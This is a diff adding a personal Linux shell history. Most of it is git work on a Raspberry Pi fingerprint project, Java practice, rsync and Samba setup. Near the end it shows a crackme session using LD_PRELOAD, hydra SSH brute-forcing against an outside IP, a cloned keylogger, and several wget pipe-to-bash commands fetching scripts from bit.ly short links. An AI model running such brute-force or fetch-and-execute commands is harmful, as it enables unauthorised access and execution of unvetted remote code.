@@ -1,0 +1,2518 @@
+cd p
+cd python/
+ls
+cd fingerprint/
+ls
+la
+git push -u origin master
+git pull git
+git
+git remote remove 
+git remote remove origin
+git remote add origin git@github.com:minlaxz/raspberrypi_fingerprint_firebase.git
+git push -u origin master
+git master
+git --help
+git pull 
+git pull -u origin master
+git pull  origin master
+ls
+rm -rf *
+ls
+la
+git pull  origin master
+git pull  origin master --allow-unrelated-histories
+ls
+touch hi.py
+nano hi.py 
+python hi.py 
+python -v hi.py 
+clear
+git sttus
+git status
+git add 
+git add .
+git status
+git commit -m "My firs commit"
+git status
+git push -u origin master
+git remote show
+git remote get-url
+git remote get-url --all
+git remote get-url --all origin
+clear
+git 
+git status
+cd ..
+mv fingerprint/ project_meec
+ls
+cd project_meec/
+ls
+clear
+ls
+git status
+git 
+git status
+git push -u origin master
+git pull origin master
+ls
+nano README.md 
+git status
+git add .
+git commit -m "initial commit for README"
+git push -u origin master
+git status
+git push -u origin master
+git pull origin master
+ls
+cat README.md 
+clear
+ll
+ls g
+ls .git
+ls
+nano .gitignore 
+clear
+python hi.py 
+clear
+ls
+laxz_open ~
+mkdir .vscode
+cd .vscode/
+nano settings.json
+cd ..
+nano .gitignore 
+git status
+git add .
+git commit -m ".gitignore modified for vscode enviroment"
+git status
+git push -u origin master
+clear
+ls
+git status
+s
+exit
+ls
+clear
+laxz_open p.
+clear
+laxz_open .
+xfce4-panel 
+laxz_open .
+git
+git remote --help
+clear
+git --help
+git remote --help
+exit
+cd
+nano .bash_aliases 
+source .basht
+source .bashrc 
+gcommit 
+cd laxz
+cd laxz0
+cd laxztest/
+ls
+ll
+git status
+rm test 
+gstaus
+gstatus
+gcommit 
+gcommit "test"
+gstatus
+gcommit "test"
+alias
+git commit -v
+cd
+nano .bash_aliases 
+source .bashrc 
+nano .bash_aliases 
+source .bashrc 
+nano .bash_aliases 
+source .bashrc 
+git st
+st
+source .bashrc 
+nano .bash_aliases 
+source .bashrc 
+gst
+cd laxztest/
+gst
+gci 
+gci -m 'tes'
+gci
+alias
+gci -m 'ok'
+git commit -m 'ok'
+gci -m "ok"
+git commit -m "ok"
+ls
+ll
+la
+st
+gst
+git commit -a
+gst
+git add .
+gci -m 'ok'
+touch a
+gst
+git add .
+alias
+gcommit "ok tho"
+gst
+unalias s
+unalias gstatus
+a;oas
+alias
+unalias gcommit 
+alias
+cd
+nano .bash_aliases 
+clea
+claer
+clear
+source .bashrc 
+lais
+laias
+alias
+nano .bash_aliases 
+source .bashrc 
+alias
+unalias gci
+alias
+clear
+cd laxztest/
+gst
+ga
+clear
+exit
+s
+ls
+s
+nano .gitignore 
+s
+git add .
+git commit -m "added dev folder for connection between OLED display(SH1106) and raspberry pi (using luma.oled)"
+s
+exit
+ls
+cd laxz
+cd laxz-priv/
+ls
+cd p
+cd python/
+ls
+clea
+clear
+ls
+cd p
+cd project_meec/
+ls
+gst
+gcl
+gck
+clear
+gck
+clear
+ls
+laxz_open ..
+git log
+claer
+clear
+gl
+alias
+gck
+gf
+gd
+clear
+ls
+nano .gitignore 
+gt
+gst
+ls oled/
+ls
+cd oled/l
+sl
+ls
+cd oled/
+ls
+cd ..
+git add .
+gci 
+alias
+gco "Added OLED display con"
+gco "Added OLED display connextion"
+gco "Added OLED display connection"
+gl
+git log
+exi
+texit
+exit
+sudo add-apt-repository -y ppa:kokoye2007/ppa
+sudo apt update
+sudo apt install myanmar-fonts-switcher zawgyi-keyboard
+sudo apt install zawgyi-keyboard
+zawgyi-keyboard 
+sudo apt search input
+sudo apt search xfce | grepinput
+sudo apt search xfce | grep input
+grep
+alias
+clear
+cd laxz
+cd laxz-priv/
+ls
+cd p
+cd python/
+ls
+cd project_meec/
+ls
+gst
+ls
+laxz_open ..
+gst
+git add .
+git commit -m "Added conn.py to check internet"
+gst
+git add .
+git commit -m "Added translator and user.log to translate fingerprint module output with user typed roll number"
+gst
+gsk
+gck
+git add .
+git commit -m "Added Firebase to interact with firebase and RaspberryPi"
+gst
+git add reg_final.py 
+git commit -m "Added Main Register File"
+git add .
+git commit -m "Added Main Scan File"
+gst
+git push -u origin master
+touch firebase/laxz-notifythis
+nano firebase/laxz-notifythis 
+gst
+git add .
+nano .gitignore 
+gst
+git add .
+gst
+git commit -m "Modify gitignore for dabase security."
+gst
+git push -u origin master
+nano .gitignore 
+gst
+git add .
+git push -u origin master
+gst
+git push -u origin master
+git commit -a
+git commit -m "Update .gitignore"
+git push -u origin master
+git pull origin master
+git push -u origin master
+ls
+cat .gitignore 
+git push -u oringin master
+git push -u origin master
+clear
+nano reg_final.py 
+code .
+gst
+git add .
+git commit -a
+git status
+git push -u origin master
+gst
+git git reset HEAD~1
+git reset HEAD~1
+git status
+git add .
+git staus
+git status
+git commit -m "Update str in register function"
+git status
+git pull origin master
+git status
+git push -u origin master
+git log
+git revert -n 1a4e481d8f044063967a1b19196faf09f3132f74
+git sta
+git status 
+git commit -m "Added OLED display connection"
+git status 
+ls
+ls oled/
+git reset HEAD~1
+ls
+ls oled/l
+ls oled/
+ls
+mkdir test
+cd test/
+git clone https://github.com/minlaxz/raspberrypi_fingerprint_firebase.git
+ls
+cd raspberrypi_fingerprint_firebase/
+ls
+git status
+laxz_open .
+cd
+cd laxz
+cd laxz-priv/
+cd p
+cd python/
+ls
+cd project_meec/
+ls
+git status
+git log
+git checkout 1a4e481d8f044063967a1b19196faf09f3132f74
+git commit -m "Added OLED display Connection"
+git status 
+git checkout master
+git status
+cd ..
+cd laxztest/
+ls
+git status
+git log
+touch b
+git add .
+git commit -m "b"
+git stauts
+git status
+ls
+touch c
+git add .
+git commit -m "c"
+git log
+nano b
+git add .
+git commit -m "b modified"
+nano b
+nano b 
+git status
+nano c
+git add .
+git commit -m "C"
+git log
+nano b
+git add .
+git commit -m "C"
+git log
+git revert 4fd044e18a88005e977f7989b2fef8c9d7e79969
+git status
+git add b
+git status
+git commit -m "ok"
+git status
+ls
+exit
+cd
+cd laxz
+cd laxz-priv/confidential/laxz_tips/
+nano git_tips
+exit
+cd
+cat .bash_history
+cd
+cd laxz-priv/
+cd confidential/laxz_tips/
+ls
+nano git_tips 
+exit
+l
+python3
+exit
+cd
+rm =rf laxztest/
+rm -rf laxztest/
+ls
+cd laxz-priv/
+ls
+cd python/
+mkdir qr
+cd qr
+ls
+cd ..
+mkdir qr_git
+cd qr_git/
+git init
+echo "# Shaine_QR_and_Print" >> README.md
+ls
+git init
+git add README.md 
+git commit README.md -m "First commit for README.md"
+git remote add origin git@github.com:minlaxz/Shaine_QR_and_Print.git
+git push -u origin master
+git statis
+git status
+cd
+cd laxz-priv/python/
+mkdir test
+cd tes
+cd test
+ls
+nano tester.oy
+nano tester.py
+cd
+exit
+cd laxz-priv/
+cd python/
+ls
+cd test
+ls
+/
+\
+cd laxz-priv/
+cd python/
+cd test
+nano test.py
+rm test
+rm test.py 
+ls
+rm tester.py.save 
+rm -rf __pycache__/
+ls
+python3
+ls
+cd __pycache__/
+ls
+file tester.cpython-36.pyc 
+cat tester.cpython-36.pyc 
+hexdump tester.cpython-36.pyc 
+hexdump -h tester.cpython-36.pyc 
+hexdump -bcCdovx tester.cpython-36.pyc 
+cd laxz
+cd laxz-priv/
+cd python/
+cd project_meec/
+ls
+git status
+git log
+git revert 1a4e481d8f044063967a1b19196faf09f3132f74
+git status
+ls
+git reset HEAD~1
+ls
+git staus
+git status
+git checkout 1a4e481d8f044063967a1b19196faf09f3132f74
+git sttaus
+git status
+git revert 1a4e481d8f044063967a1b19196faf09f3132f74
+rm -rf *
+ld
+ll
+la
+rm --help
+rm .git
+rm -r .git
+rm -rf .git
+ls
+ll
+la
+rm .gitignore 
+ls
+la
+ll
+clear
+git clone https://github.com/minlaxz/raspberrypi_fingerprint_firebase.git
+ls
+cd raspberrypi_fingerprint_firebase/
+ls
+git log
+git revert 1a4e481d8f044063967a1b19196faf09f3132f74
+git log
+ls
+cd ..
+rm -rf raspberrypi_fingerprint_firebase/
+ls
+git clone https://github.com/minlaxz/raspberrypi_fingerprint_firebase.git
+ls
+cd raspberrypi_fingerprint_firebase/
+ls
+git rebase --interactive '1a4e481d8f044063967a1b19196faf09f3132f74^'
+git commit --all --amend --no-edit
+git status 
+git rebase --continue
+ls oled/
+git rebase --interactive '1a4e481d8f044063967a1b19196faf09f3132f74^'
+git commit --all --amend --no-edit
+git rebase --continue
+git staus
+git status
+ls
+ls oled/
+git log
+claer
+clear
+git status
+git rebase --interactive '1a4e481d8f044063967a1b19196faf09f3132f74^'
+git commit --amend -m "OLED connection"
+git status
+git rebase --continue 
+git status
+git log
+git status
+git pull origin master
+git status
+git push -u origin master 
+git push
+ls
+nano scan_final.py 
+git sttaus
+git status
+git add .
+git commit -m "Just modified # for error"
+git status
+git push -u origin master 
+git
+git 
+git remote --help
+git status
+ssh -T git@github.com:minlaxz/raspberrypi_fingerprint_firebase.git
+ssh -T git@github.com
+git status
+git push -u origin master 
+ssh git@github.com:minlaxz/raspberrypi_fingerprint_firebase.git
+git remote add origin git@github.com:minlaxz/raspberrypi_fingerprint_firebase.git
+git remote 
+git remote -h
+git remote remove origin 
+git remote add origin git@github.com:minlaxz/raspberrypi_fingerprint_firebase.git
+git remote
+git staus
+git status
+git push -u oringin master
+git push -u origin master
+git sttaus
+git status
+code .
+ls
+git status
+nano oled/device_oop.py 
+mv oled/device_oop.py oled/oled_device_oop.py
+git add .
+ls
+cat .gitignore i
+cat .gitignore 
+ll
+git add .
+git commit oled/oled_device.py -m "Updated: remove unnecessary libs"
+git commit oled/oled_device_oop.py -m "BETA version of oled device (oop styled)"
+git status
+git push
+exit
+ls
+sudo apt update
+sudo apt upgrade
+sudo apt install openssh-server
+ufw
+ufw --help
+ufw status
+sudo ufw status
+clewar
+clear
+sudo service --status-all
+ssh minlaxz@localhost
+sudo ifconfig
+ssh minlaxzvm@10.0.2.15
+cd laxz-priv/confidential/laxz_tips/
+ls
+cat linux_tips 
+python3
+exit
+curl https://www.dataplicity.com/devices/ae88894d-34a1-40c3-ae41-be07f74c74bf/
+curl
+curl --help
+curl -v http://example.com
+curl -vL http://example.com
+curl -L http://example.com
+curl -v -L http://example.com
+curl -A "I am your father" http://example.com
+exit
+python3
+cd laxz-priv/
+cd python/
+ls
+cd project_meec/
+ls
+cd raspberrypi_fingerprint_firebase/
+ls
+git status
+clear
+cd firebase/
+ls
+cd ..
+ls
+cd oled/
+ls
+cd ..
+ls
+cat user.log 
+nano user.log 
+git status
+ls
+cd firebase/
+ls
+git add .
+git commit -m "Updated to avoid error"
+ls
+cd ..
+git commit -m "Updated to avoid error"
+git add .
+git commit -m "Updated to avoid error"
+git status
+ls
+cd firebase/
+ls
+nano firebase_utils.py 
+cd ..
+code .
+exit
+exit
+cd
+nano .bash_history
+exit
+cd
+cd laxz-priv/confidential/ls
+ls
+cd laxz-priv/confidential/
+ls
+cd laxz_tips/
+ls
+cat git_tips 
+ls
+cat lo
+cat local 
+clear
+ls
+cat git_tips 
+ls
+find rebase
+laxz_open .
+nano git_commit_undo_tips
+exit
+cd laxz-priv/
+ls
+cd python/
+ls
+cd project_meec/
+ls
+cd raspberrypi_fingerprint_firebase/ls
+ls
+cd raspberrypi_fingerprint_firebase/
+ls
+git status
+git add .
+git diff
+git commit -m "Update Firebaseutils"
+git status
+git push
+laxz_open .
+git status
+git log
+git log |  grep delete
+git log
+clear
+git reset --hard ee9e423be9e39b856c47a1d9cd710f9a085b3178
+git status
+git clean -f
+git pull
+git status
+git checkout
+git rebase --help
+git checkout
+git rebase
+git checkout master
+git status
+git push
+git log --pretty=oneline --abbre
+git log --pretty=oneline
+git log --pretty=oneline --abbrec-commit
+git log --pretty=oneline --abbrev-commit
+git rebase -i ee9e423
+git status
+git rebase --continue 
+git commit --allow-empty
+git staus
+git status
+git commit --amend
+git reset HEAD^
+git status
+git rebase continue
+git rebase --continue
+git rebase --continue 
+git rebase --abort 
+git status
+git log
+git log --pretty=oneline --abbrev-commit
+clear
+git rebase -i HEAD~2
+git status
+git rebase -i HEAD
+git rebase -i ee9e423
+git commit --allow-empty
+git status
+git commit --amend ee9e423
+git rebase --continue 
+git rebase --abort 
+git status
+git checkout
+git checkout --help
+git checkout master
+git log 
+git checkout d6db50d539f28071514f5a2cd87d2e71ab66c0fc
+git checkout -b minor_1
+git cherry-pick 614a58c0af9b121d073bebba4fb4de7922b2bea8
+git checkout master
+git reset --hard d6db50d539f28071514f5a2cd87d2e71ab66c0fc
+git mearge minor_1
+git merge minor_1 
+git status
+git log
+git status
+git checkout 
+git checkout d6db50d539f28071514f5a2cd87d2e71ab66c0fc
+git log
+clear
+cd ..
+rm -rf raspberrypi_fingerprint_firebase/
+ls
+cd raspberrypi_fingerprint_firebase/
+ls
+git status
+git log
+git checkout ee9e423be9e39b856c47a1d9cd710f9a085b3178
+git checkout master
+git checkout 614a58c0af9b121d073bebba4fb4de7922b2bea8
+git checkout -b minor_1
+git cherry-pick d6db50d539f28071514f5a2cd87d2e71ab66c0fc
+
+git cherry-pick d6db50d539f28071514f5a2cd87d2e71ab66c0fc -m 1bdd8b1
+git cherry pick fdfdc0f0e360a4808fb3697fdd7b80fd4179e8f5
+git cherry-pick fdfdc0f0e360a4808fb3697fdd7b80fd4179e8f5
+git cherry-pick 4005a0418475c8b9d98e3f91559e71b8864eb02f
+git cherry-pick 94b65f46777b86c1d140fb8757bf5143752ae66c
+git cherry-pick f58de3b6c321a74b3dacff15b52a801c55bcda92
+git cherry-pick 
+git cherry-pick 370b6227241d723f9493d68503a31911851eee94
+git status
+git checkout master
+git reset --hard 614a58c0af9b121d073bebba4fb4de7922b2bea8
+git merge minor_1 
+git status
+git push --force origin master
+git status 
+ls firebase/
+rm firebase/s_key.json 
+git status
+git add .
+git commit -m "Update"
+git pull
+git status
+ls firebase/
+git log
+clear
+file 1ea10421ce383d609cf5840b75a6a2bb5e8e78 
+zlib-flate -uncompress 1ea10421ce383d609cf5840b75a6a2bb5e8e78 
+zlib-flate -uncompress < 1ea10421ce383d609cf5840b75a6a2bb5e8e78 
+clear
+exit
+cd
+cd laxz-priv/confidential/laxz_tips/
+ls
+cat git_tips 
+nano git_tips 
+cd
+cd laxz-priv/python/
+ls
+cd project_meec/
+laxz_open .
+exit
+cd ..
+cd 
+cp BACKUP/raspberrypi_fingerprint_firebase/ laxz-priv/python/project_meec/
+cp -r BACKUP/raspberrypi_fingerprint_firebase/ laxz-priv/python/project_meec/
+cd .ssh/
+cat id_rsa.pub 
+ssh -T git@gitlab.com
+cd
+cd laxz-priv/
+ls
+cd python/
+ls
+mkdir meec_project
+cd meec_project/
+git init
+code .
+git sttaus
+git status
+clear
+nano .gitignore
+gst
+git add . 
+git reset 
+gst
+git commit -m "initial commit"
+git status
+git add . 
+git commit -m "Updated required env"
+git status
+git remote add origin git@gitlab.com:minlaxz/rpi_fig_fbase.git
+git remote
+git pull origin master
+ls
+ll
+git status
+git push
+git push -u origin master 
+git pull
+git pull -u origin master 
+git pull origin master 
+git pull origin master --allow-unrelated-histories
+ls
+git push 
+git push -u origin master 
+nano README.md 
+git add .
+git push
+gst
+git commit -m "markdown test"
+git push
+ls
+code .
+ls
+gst
+git add .
+laxz_open .
+git commit -m "added LICENSE"
+git push
+gst
+git add .
+git commit -m "Initial Commit"
+git push
+sudo ifconfig
+exit
+ls
+clear
+ls
+cd laxz-priv/
+ls
+cd python/
+ls
+cd meec_project/
+ls
+cd ..
+sudo shutdown now
+cd .ssh
+ls
+cat id_rsa.pub 
+python3 -m http.server 8080
+ssh laxzvm@172.83.15.243
+ssh -T laxzvm@172.83.15.243
+clera
+clear
+ssh -T laxzvm@172.83.15.243
+ssh laxzvm@172.83.15.243
+exit
+cat id_rsa.pub 
+celar
+clear
+exit
+java
+javac
+sudo apt update
+sudo apt upgrade
+cd .ssh/
+ls
+python3 -m http.server 8080
+clear
+exit
+ls
+cd
+claer
+clea
+clear
+cd .ssh
+cat id_rsa.pub 
+exit
+ls
+cd
+la
+cat .bash_history
+cd laxz-priv/confidential/l
+cd laxz-priv/confidential/laxz_tips/
+ls
+clear
+nano rsync_tips
+clear
+nano rsync_tips 
+cd .ssh/
+ls
+cat id_rsa.pub 
+cd
+ls
+cd /
+cd 
+cd laxz-priv/
+ls
+cd p
+cd python/
+ls
+nano del_finger.py 
+cd
+cat laxz-priv/confidential/laxz_tips/
+cd laxz-priv/confidential/laxz_tips/
+ls
+cat lo
+cat local 
+clear
+mv local windows_diskpart
+ls
+clear
+ls
+cat explorer 
+cd
+nano .bash_history
+clear
+nano laxz-priv/confidential/laxz_tips/
+nano laxz-priv/confidential/laxz_tips/ssh_bind
+ssh -L
+nano laxz-priv/confidential/laxz_tips/ssh_bind
+ping 172.83.15.243 -t
+ping 172.83.15.243
+ping 172.83.15.243 -T
+ping 172.83.15.243 -t ttl
+wget 172.83.15.243:6060/.bash_histroey
+wget 172.83.15.243:6060/.bash_history
+wget http://172.83.15.243:6060/.bash_history
+wget http://172.83.15.243:8080/.bash_history
+clear
+rsync
+clear
+cd laxz-priv/
+mkdir from_cloud
+cd from_cloud/
+rsync -v -e ssh minlaxz@debivm-c4r8:.bash_history 
+rsync -v -e ssh minlaxz@139.59.90.220:.bash_history 
+rsync
+rsync -v -e ssh minlaxz@139.59.90.220:.bash_history 
+ls
+ll
+ls
+la
+rsync -v -e ssh minlaxz@139.59.90.220:.bash_history .
+ls
+la
+ls
+la
+clear
+mkdir test
+touch test/testfile1
+touch test/testfile2
+touch test/testfile3
+rsync -r -a -v -e ssh --delete /home/minlaxz/laxz-priv/from_cloud/test minlaxz@Here is a list of some of the most common rsync options:
+rsync -r -a -v -e ssh --delete /home/minlaxz/laxz-priv/from_cloud/test minlaxz@139.59.90.220:/home/minalaxz/test
+rsync -r -a -v -e ssh --delete /home/minlaxz/laxz-priv/from_cloud/test minlaxz@139.59.90.220:/home/minlaxz/test
+rsync -r -a -v -e ssh --delete /home/minlaxz/laxz-priv/from_cloud/test minlaxz@139.59.90.220:/home/minlaxz/
+rsync -r -a -p -v -e ssh --delete /home/minlaxz/laxz-priv/from_cloud/test minlaxz@139.59.90.220:/home/minlaxz/
+rsync -r -a -P -v -e ssh --delete /home/minlaxz/laxz-priv/from_cloud/test minlaxz@139.59.90.220:/home/minlaxz/
+nano test/testfile1
+rsync -r -a -P -v -e ssh --delete /home/minlaxz/laxz-priv/from_cloud/test minlaxz@139.59.90.220:/home/minlaxz/
+rsync -r -a -P -v -e ssh --delete /home/minlaxz/laxz-priv/from_cloud/test minlaxz@139.59.90.220:/home/minlaxz/cd ..
+cd ..
+nano .bashrc 
+md
+mkdir FromLocal
+mkdir ToLocal
+nano .bashrc 
+ls
+rm -rf FromLocal/
+rm -rf ToLocal/
+ls
+sshvm
+clear
+exit
+cd test/
+nano testfile
+nano testfile1
+ll
+ll -h
+cd ..
+rm -rf from_cloud/
+ls
+exit
+sudo apt install kazam
+cd laxz-priv/confidential/laxz_tips/
+ls
+nano rsync_tips 
+cd
+cd laxz-priv/
+mkdir FromCloud
+mkdir ToCloud
+cd
+nano .bashr
+nano .bashrc 
+source .bashrc 
+alias
+alert 'hi'
+clear
+local2cloud 
+cd laxz-priv/
+ls
+cd ToCloud/
+ls
+touch thisistestfile
+local2cloud 
+clear
+exit
+ifconfig
+$JAVA_HOME
+clear
+cd /etc
+cat environment 
+cd
+clear
+nano .bashrc 
+source .bashrc 
+alias
+unalias sshcloud
+sshvm
+nano .bash
+nano .bashrc 
+ssh -l root 139.59.90.220
+ssh debian@139.59.90.220
+ssh -l root 139.59.90.220
+sshvm
+ssh root@139.59.90.220
+sshvm
+ssh root@139.59.90.220
+nano .bashrc 
+unalias sshvm
+source .bashrc 
+sshvm
+ssh root@139.59.90.220
+sshv,
+sshvm
+clear
+sshvm
+ssh root@139.59.90.220
+exit
+parted
+lsblk
+sudo umount /dev/sdb
+sudo umount /dev/sdb1
+laxzopen /
+sudo umount /dev/sdb1
+sudo umount /dev/sdb
+lsbl
+sudo umount /dev/sdb1
+sudo umount /dev/sdb
+sudo umount /dev/sdb1
+sudo parted /dev/sdb1
+sudo parted /dev/sdb1 rm 1
+cat /etc/fstab 
+sudo parted /dev/sdb mkpart primary ntfs 0 100%
+exit
+ls
+cd laxz-priv/confidential/laxz_tips/
+ls
+cat usb_dev_tips 
+sudo apt install gparted
+gparted
+sudo gparted
+clear
+exit
+lsblk
+disk
+clear
+fdisk
+ckear
+fdisk --help
+lsblk
+fdisk -w sdb
+fdisk -w exp4 sdb
+clear
+gpart
+gpartd
+gparted
+clear
+exit
+java
+sudo apt show default-jre
+javac
+sudo apt show default-jdk
+javac
+sudo apt install default-jdk
+cd .wine/drive_c/users/minlaxz/Downloads/
+ls
+cd Video/
+ls
+vlc 01351_720p.mp4 
+clear
+gtk
+clear
+sudo apt install default-jdk
+java
+javac
+JAVA_HOME
+D$JAVA_HOME
+$JAVA_HOME
+vlc
+vlc 01351_720p.mp4 
+clear
+ls
+exi
+exit
+cd
+laxzopen 
+laxzopen .
+sshvm
+./passdump 
+clear
+./passdump 
+exi
+exit
+cd 
+cd Downloads/
+ls
+cd hackme_files/
+ls
+cp passdump.c ~/laxz-priv/hackme/
+exit
+./hackme 
+./hackme
+cat hackme
+clea
+clear
+file hackme
+gdb 
+gdb ./hackme 
+./hackme 
+clear
+gdb hackme 
+strace hackme
+strace ./hackme
+strings
+strings hackme
+ltrace hack
+ltrace hackme
+ltrace ./hackme
+mkdir ~/laxz-priv/hackme
+mv hackme ~/laxz-priv/hackme/
+ls hackme
+cd
+cd laxz-priv/
+cd hackme/
+ls
+./hackme 
+clear
+nano fake.c
+gcc-shared
+gcc -shared -fPlC -o fake.so fake.c
+gcc -shared -fPIC -o fake.so fake.c
+ls
+strace -E LD_PRELOAD=./fake.so ./hackme
+strace -E LD_PRELOAD=./fake.so ./hackme | grep password
+objdump -D ./hackme > out.asm
+ls
+cat out.asm 
+nano cracker.c
+mv cracker.c cracker
+./cracker
+sudo chmod 700 cracker 
+./cracker 
+file cracker 
+nano cracker 
+mv cracker cracker.c
+gcc -shared -fPlC -o cracker cracker.c 
+gcc -shared -fPIC -o cracker cracker.c 
+ls
+gcc -o cracker cracker.c 
+ls
+rm cracker.c 
+gcc -o passdump passdump.c 
+nano passdump
+ls
+./passdump 
+clear
+nano passdump.c 
+rm passdump
+gcc -o passdump passdump.c 
+nano passdump.c 
+cat passdump.c | grep hackme
+cat passdump.c | grep hack
+cat passdump.c | grep includ
+cat passdump.c | grep include
+nano passdump.c 
+./passdump 
+./hackme 
+clear
+l
+;s
+cd
+clear
+cd laxz-priv/
+ls
+clear
+ls
+cd
+cd .wine/
+ls
+cd drive_c/
+cd users/
+cd minlaxz/
+cd Downloads/
+ls
+cd Video/
+ls
+cp 01351_720p.mp4 ~/laxz-priv/smbshare/
+rm ~/laxz-priv/smbshare/*
+cp -v 01351_720p.mp4 ~/laxz-priv/smbshare/
+exit
+cd 
+cd /etc/samba/
+ls
+sudo nano smb.conf 
+sudo service smbd restart 
+sudo smbpasswd -a minlaxz
+sudo nano smb.conf 
+sudo service smbd restart 
+sudo nano smb.conf 
+sudo service smbd restart 
+clear
+exit
+htop
+clear
+smb
+smaba
+samba
+sudo apt install samba
+sudo nano /etc/samba/smb.conf 
+ls
+cd laxz-priv/
+cd ..
+cd laxz-priv/
+mkdir smbshare
+exit
+sudo ifconfug
+sudo ifconfig
+clear
+cd
+cd laxz-priv/
+cd confidential/
+cd laxz_tips/
+ls
+nano smb_tips
+exit
+uptime 
+sudo shutdown now
+clear
+sudo shutdown now
+sshvm
+exit
+ls
+cd ls
+dc laxz-priv/
+ls
+ll
+clear
+ls -al
+cd laxz-priv/
+ls
+ls -al
+ls confidential/
+cd machine-learning/
+ls
+java -v
+java -V
+java -verison
+java -version
+ls
+sudo nano /bin/laxz 
+nano ~/.bashrc 
+alias
+cloud2local 
+ls
+cd ..
+mkdir java
+ls
+cd ja
+cd java/
+code .
+ls
+clear
+cd laxz-priv/
+cd java/
+ls
+cat ONEst.java 
+clea
+clear
+l
+cat ONEst.java 
+clear
+ls
+nano ONEst.java 
+mv ONEst.java ONEJAVA.java
+nano ONEJAVA.java 
+mv ONEJAVA.java ONEJava.java
+ls
+javac ONEJava.java 
+java ONEClass 
+ls
+nano TWOJava.java
+javac TWOJava.java 
+nano TWOJava.java 
+mv TWOJava.java TWOClass.java
+javac TWOClass.java 
+java TWOClass 
+ls
+nano THREEJava.java
+javac THREEJava.java 
+ls
+nano THREEJava.java 
+javac THREEJava.java 
+java THREEClass 
+ls
+rm MyClass.class 
+ls
+nano THREEJava.java 
+java THREEClass 
+javac THREEJava.java 
+java THREEClass 
+nano THREE
+nano THREEJava.java 
+exit
+nano FOURJava.java 
+exit
+which bash
+nano SIXJava.java
+javac SIXJava.java 
+java SixClass 
+nano SIXJava.java 
+javac SIXJava.java 
+java SixClass 
+clear
+nano SEVENJava.java
+javac SEVENJava.java 
+java SevenClass 
+nano SEVENJava.java
+javac SEVENJava.java 
+java SevenClass 
+nano EIGHTJava.java
+javac EIGHTJava.java 
+nano EIGHTJava.java
+javac EIGHTJava.java 
+java EightClass 
+exit
+nano FOURJava.java
+javac FOURJava.java 
+java FourClass 
+nano FOURJava.java 
+java FourClass 
+javac FOURJava.java 
+java FourClass 
+nano FOURJava.java 
+javac FOURJava.java 
+nano FOURJava.java 
+javac FOURJava.java 
+java FourClass 
+nano FOURJava.java 
+ls
+nano FOURJava.java 
+javac FOURJava.java 
+nano FOURJava.java 
+javac FOURJava.java 
+java FourClass 
+nano FOURJava.java 
+javac FOURJava.java 
+java FourClass 
+nano FOURJava.java 
+javac FOURJava.java 
+nano FOURJava.java 
+javac FOURJava.java 
+java FourClass 
+nano FOURJava.java 
+clear
+nano FOURJava.java 
+javac FOURJava.java 
+java FourClass
+clear
+nano FOURJava.java 
+javac FOURJava.java 
+java FourClass 
+nano FIVEJava.java
+javac FIVEJava.java 
+java FiveClass 
+clear
+nano FIVEJava.java 
+javac FIVEJava.java 
+nano FIVEJava.java 
+javac FIVEJava.java 
+java FiveClass 
+bash
+aexeit
+exit
+sshcm
+sshvm
+cd laxz-priv/python/
+ls
+cd project_meec/
+ls
+cd rp
+cd raspberrypi_fingerprint_firebase/
+ls
+nano scan_final.py 
+git remote
+git push
+clear
+laxzopen .
+git init
+ssh -T git@github.com
+git remote add origin git@github.com:minlaxz/rpi_fingerprint_fbase.git
+git remote
+git pull -u origin master
+git pull origin master
+nano .gitignore 
+clear
+git remote
+git status
+git add .gitignore 
+git commit -m "Initial commit"
+git status
+git add .
+git commit -m "vs code env settings"
+git status
+nano .gitignore 
+git add .
+git commit -m "Update Commit for __PYCACHE__"
+clear
+ls
+git status
+git add dev/
+git commit -m ""
+git commit -m "Device Connections"
+git add .
+git status
+git commit -m "OLED configs"
+clear
+ls
+git status
+git staus
+git add .
+git commit -m "Conection checker"
+git add .
+git commit -m "REGISTER FILE."
+git add .
+git commit -m "FINGERPRINT SCAN FILE."
+git add translator.py 
+git commit -m "Fingerprint and Firebase translator"
+git add .
+git commit -m "Local database (roll numbers)"
+git status
+git push -u origin master 
+nano scan_final.py 
+nano reg_final.py 
+git status]
+git status
+git add .
+git commit -m "To ensure that not to be secreted functions"
+git pus
+git push
+cd ..
+cd .
+cd ..
+mkdir hackyhack
+cd hackyhack/
+cd .
+cd ..
+ls
+cd hackyhack/
+nano pass.txt
+nano name.txt
+hydra
+sudo a[t install hydra
+sudo apt install hydra
+hydra -L name.txt -P pass.txt 74.50.208.149ssh
+hydra -L name.txt -P pass.txt 74.50.208.149:22
+hydra -L name.txt -P pass.txt localhost ssh
+ls
+mkdir hydra
+mv * hydra/
+ls
+git clone https://github.com/kmangalorekar/keylogger.git
+showkey
+cd
+ls
+nano .local/
+nano logger.txt 
+cd laxz-priv/hackyhack/
+ls
+cd keylogger/
+ls
+cd ..
+nano laxz.md
+alias
+notify-send "Hi Min Latt" --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"
+cd 
+ls
+rm logger.py 
+rm logger.txt 
+nano pass.txt 
+curl https://ipinfo.io/ip
+cd
+showkey laxz.txt
+showkey ./laxz.txt
+https://github.com/kmangalorekar/keylogger.git
+sudo showkey > ./logger.txt
+wget -o https://raw.githubusercontent.com/minlaxz/hackyhack/master/welcome | bash
+wget -o https://raw.githubusercontent.com/minlaxz/hackyhack/master/welcome
+wget -O https://raw.githubusercontent.com/minlaxz/hackyhack/master/welcome | bash
+wget -O - https://raw.githubusercontent.com/minlaxz/hackyhack/master/welcome | bash
+wget -O - https://raw.githubusercontent.com/minlaxz/hackyhack/master/welcome > /dev/null | bash
+wget -O - https://raw.githubusercontent.com/minlaxz/hackyhack/master/welcome | bash
+wget -O - https://raw.githubusercontent.com/minlaxz/hackyhack/master/welcome | bash > /dev/null
+wget -O - >/dev/null https://raw.githubusercontent.com/minlaxz/hackyhack/master/welcome | bash
+wget -O - https://raw.githubusercontent.com/minlaxz/hackyhack/master/welcome | bash
+wget -O - https://bit.ly/laxzhack
+wget -O - https://bit.ly/laxzhack | bash
+wget -qO - https://bit.ly/laxzhack | bash
+clear
+wget -qO - https://bit.ly/opensshgit | bash
+passwd $USER
+sudo passwd $USER
+su
+wget -qO - https://bit.ly/opensshgit | bash
+laxzopen laxz-priv/hackyhack/
+clear
+laxzopen laxz-priv/hackyhack/
+wget -qO - https://bit.ly/opensshgit | bash
+sudo -i
+wget -qO - https://bit.ly/opensshgit | bash
+wget -qO - https://bit.ly/opensshgit
+ok
+ls
+wget -qO - https://bit.ly/opensshgit
+hi
+wget -qO - https://bit.ly/opensshgit | bash
+aaaa
